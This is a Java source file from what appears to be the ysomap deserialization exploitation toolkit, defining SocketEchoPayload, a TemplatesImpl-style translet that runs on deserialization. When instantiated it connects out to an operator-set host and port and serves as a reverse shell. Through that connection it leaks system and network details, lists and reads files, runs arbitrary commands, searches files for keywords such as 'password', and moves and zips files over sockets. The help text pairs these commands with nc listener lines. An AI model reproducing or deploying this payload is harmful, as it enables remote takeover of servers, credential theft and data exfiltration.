package com.orleven.ysomap.echo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * @author wh1t3P1g
 * @since 2021/6/16
 */
public class SocketEchoPayload extends AbstractTranslet implements Serializable, Runnable {

    private static String host;
    private static int port;

    public SocketEchoPayload(){
        transletVersion = 101;
        new Thread(this).start();
    }
    public static void main(String[] args) {
        SocketEchoPayload s = new SocketEchoPayload();
    }


    public String list(String path){
        if(path != null && !path.isEmpty()){
            try {
                StringBuilder stringBuilder = new StringBuilder();
                File file = new File(path.trim());
                if(file.isDirectory()){
                    File[] files = file.listFiles();
                    for(File tmp:files){
                        if(tmp.isDirectory()){
                            stringBuilder.append("directory: "+tmp.getAbsolutePath()).append("\n");
                        }else if(tmp.isFile()){
                            stringBuilder.append("file: "+tmp.getAbsolutePath()).append("\n");
                        }else{
                            stringBuilder.append("other: "+tmp.getAbsolutePath()).append("\n"); // other
                        }
                    }
                    return stringBuilder.toString();
                }else if(file.isFile()){
                    return read(path);
                }
            } catch (Exception e) {
                // do nothing
            }
        }
        return null;
    }

    public String read(String file) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader read = new BufferedReader(
                new InputStreamReader(Files.newInputStream(Paths.get(file.trim()))));
        String line2 = null;
        while ((line2 = read.readLine()) != null) {
            stringBuilder.append(line2).append("\n");
        }
        return stringBuilder.toString();
    }

    public String info() throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        String os = System.getProperty("os.name");
        stringBuilder.append("os: ").append(os).append("\n");
        String username = System.getProperty("user.name");
        stringBuilder.append("whoami: ").append(username).append("\n");
        String home = System.getProperty("user.home");
        stringBuilder.append("home: ").append(home).append("\n");
        String dir = System.getProperty("user.dir");
        stringBuilder.append("dir: ").append(dir).append("\n");
        stringBuilder.append("newtork: ").append("\n");
        java.util.Enumeration<java.net.NetworkInterface> nifs = java.net.NetworkInterface.getNetworkInterfaces();
        while (nifs.hasMoreElements()) {
            java.net.NetworkInterface nif = nifs.nextElement();
            java.util.Enumeration<java.net.InetAddress> addresses = nif.getInetAddresses();
            while (addresses.hasMoreElements()) {
                java.net.InetAddress addr = addresses.nextElement();
                stringBuilder.append("address: ").append(addr.getHostAddress()).append(", interface: ").append(nif.getName()).append("\n");
            }
        }
        return stringBuilder.toString();
    }

    public String find(String filename, String filenameKey, String keyword) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        if(filenameKey.length()<3 || keyword.length() < 3){
            stringBuilder.append("suffix or keyword is too shortly!");
        }else{
            stringBuilder = getSearchResult(stringBuilder, filename, filenameKey, keyword);
        }
        return stringBuilder.toString();
    }

    public String upload(String filepath, String address){
        StringBuilder stringBuilder = new StringBuilder();
        Socket socket = null;
        FileOutputStream fos = null;
        try {
            File file = new File(filepath);
            if (!file.exists()) {
                String[] remote = address.split(":");
                String host = remote[0];
                int port = Integer.parseInt(remote[1]);
                socket = new Socket(host,port);
                InputStream in = socket.getInputStream();
                fos = new FileOutputStream(filepath);
                byte[] data = new byte[1024];
                int len = 0;
                while((len = in.read(data)) != -1)
                    fos.write(data, 0, len);
                OutputStream out = socket.getOutputStream();
                out.write(data);

                stringBuilder.append("upload ").append(filepath).append(" from ").append(address).append(" by socket");
            }else{
                stringBuilder.append("file ").append(filepath).append("is exist!");
            }
        } catch (Exception e) {
        } finally {
            try {
                if(socket != null){
                    socket.close();
                }
                if(fos != null){
                    fos.close();
                }
            }catch (Exception e) {
            }
        }
        return stringBuilder.toString();
    }


    public static String zip(String srcpath, String dstpath)throws RuntimeException{
        StringBuilder stringBuilder = new StringBuilder();
        FileOutputStream fos = null;
        ZipOutputStream zos = null;
        try {
            fos= new FileOutputStream(new File(dstpath));
            zos = new ZipOutputStream(fos);
            File sourceFile = new File(srcpath);
            compress(sourceFile,zos,sourceFile.getName());
            stringBuilder.append("zip ").append(srcpath).append(" to ").append(dstpath);
        } catch (Exception e) {

        }finally{
            if(zos != null){
                try {
                    zos.close();
                } catch (IOException e) {
                }
            }
        }
        return stringBuilder.toString();
    }


    public String download(String filepath, String address){
        StringBuilder stringBuilder = new StringBuilder();
        Socket socket = null;
        FileInputStream fis = null;
        try {
            String[] remote = address.split(":");
            String host = remote[0];
            int port = Integer.parseInt(remote[1]);
            socket = new Socket(host,port);
            OutputStream out = socket.getOutputStream();
            File file = new File(filepath);
            fis = new FileInputStream(file);
            byte[] data = new byte[1024];
            int len = 0;
            while((len = fis.read(data)) != -1)
                out.write(data, 0, len);
            stringBuilder.append("download ").append(filepath).append(" to ").append(address).append(" by socket");
        } catch (Exception e) {
        } finally {
            try {
                if(socket != null){
                    socket.close();
                }
                if(fis != null){
                    fis.close();
                }
            }catch (Exception e) {

            }
        }
        return stringBuilder.toString();
    }

    private static void compress(File sourceFile, ZipOutputStream zos, String name) throws Exception{
        byte[] buf = new byte[2048];
        if(sourceFile.isFile()){
            zos.putNextEntry(new ZipEntry(name));
            int len;
            FileInputStream in = new FileInputStream(sourceFile);
            while ((len = in.read(buf)) != -1){
                zos.write(buf, 0, len);
            }
            zos.closeEntry();
            in.close();
        } else {
            File[] listFiles = sourceFile.listFiles();
            if(listFiles == null || listFiles.length == 0){
                zos.putNextEntry(new ZipEntry(name + "/"));
                zos.closeEntry();
            }else {
                for (File file : listFiles) {
                    compress(file, zos, name + "/" + file.getName());
                }
            }
        }
    }

    public String exec(String command){
        StringBuilder result = new StringBuilder();

        Process process = null;
        BufferedReader bufferIn = null;
        BufferedReader bufferError = null;

        try {
            process = Runtime.getRuntime().exec(command);

            process.waitFor();

            bufferIn = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"));
            bufferError = new BufferedReader(new InputStreamReader(process.getErrorStream(), "UTF-8"));

            String line = null;
            while ((line = bufferIn.readLine()) != null) {
                result.append(line).append('\n');
            }
            while ((line = bufferError.readLine()) != null) {
                result.append(line).append('\n');
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            closeStream(bufferIn);
            closeStream(bufferError);

            if (process != null) {
                process.destroy();
            }
        }

        return result.toString();
    }

    private static void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (Exception e) {
                // nothing
            }
        }
    }

    public void run(){
        try {
            String sepS = "===============Start==================\n";
            String sepE = "===============Ended==================\n";
            Socket socket = new Socket(host, port);
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
            bufferedWriter.write("happy everyday!\n");
            bufferedWriter.write("\n");
            bufferedWriter.write(info());
            bufferedWriter.write("\n");
            bufferedWriter.write("help:\n");
            bufferedWriter.write("info | list [dir] | read [file] | exec [cmd]\n");
            bufferedWriter.write("find [dir];[name];[keyword]      PS: ./;conf;password\n");
            bufferedWriter.write("upload [path];[host]:[port]      PS: nc -l port < filename\n");
            bufferedWriter.write("download [path];[host]:[port]    PS: nc -l port > filename\n");
            bufferedWriter.write("zip [srcpath];[dstpath]          PS: zip /home/xxx;xxx.zip\n");
            bufferedWriter.write("\n");
            bufferedWriter.flush();

            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
            while (true) {
                String line;
                while ((line = bufferedReader.readLine()) == null)
                    ;
                if(line.equals("exit")){
                    return;
                }
                try{
                    StringBuilder result = new StringBuilder();
                    result.append(sepS);
                    if(line.startsWith("list")){
                        String path = line.substring(5);
                        result.append(list(path));
                    }else if(line.startsWith("read")){
                        String file = line.substring(5);
                        result.append(read(file));
                    }else if(line.startsWith("exec")){
                        String command = line.substring(5);
                        result.append(exec(command));
                    }else if(line.startsWith("info")){
                        result.append(info());
                    }else if(line.startsWith("find")){
                        String[] strArr = line.substring(5).split(";");
                        result.append(find(strArr[0], strArr[1], strArr[2]));
                    }else if(line.startsWith("download")){
                        String[] strArr = line.substring(9).split(";");
                        result.append(download(strArr[0], strArr[1]));
                    }else if(line.startsWith("upload")){
                        String[] strArr = line.substring(7).split(";");
                        result.append(upload(strArr[0], strArr[1]));
                    }else if(line.startsWith("zip")){
                        String[] strArr = line.substring(4).split(";");
                        result.append(zip(strArr[0], strArr[1]));
                    }
                    result.append(sepE);
                    bufferedWriter.write(result.toString());
                    bufferedWriter.flush();
                }catch (Exception e){
                    //
                    bufferedWriter.write("error, try again!");
                    bufferedWriter.flush();
                }
            }

        } catch (IOException e) {
            // do nothing
        }
    }

    public StringBuilder getSearchResult(StringBuilder stringBuilder, String strPath, String suffix, String keyword) {
        File dir = new File(strPath);
        File[] files = dir.listFiles(); // 该文件目录下文件全部放入数组
        if (files != null) {
            for (int i = 0; i < files.length; i++) {
                String fileName = files[i].getName();
                if (files[i].isDirectory()) {
                    stringBuilder = getSearchResult(stringBuilder, files[i].getAbsolutePath(), suffix, keyword);
                } else if (fileName.contains(suffix)) {
                    // 匹配文件内容
                    File file = files[i];
                    if (file.exists()) {
                        String s = file.getAbsolutePath();
                        try {
                            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(s)), "UTF-8"));
                            String lineTxt = null;
                            while ((lineTxt = br.readLine()) != null) {
                                // 忽略大小写
                                if (lineTxt.toLowerCase().contains(keyword.toLowerCase())) {
                                    stringBuilder.append("find: " + s + ": " + lineTxt).append("\n");;
                                    break;
                                }
                            }
                            br.close();
                        } catch (Exception e) {
                        }
                    }
                } else {
                    continue;
                }
            }
        }
        return stringBuilder;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
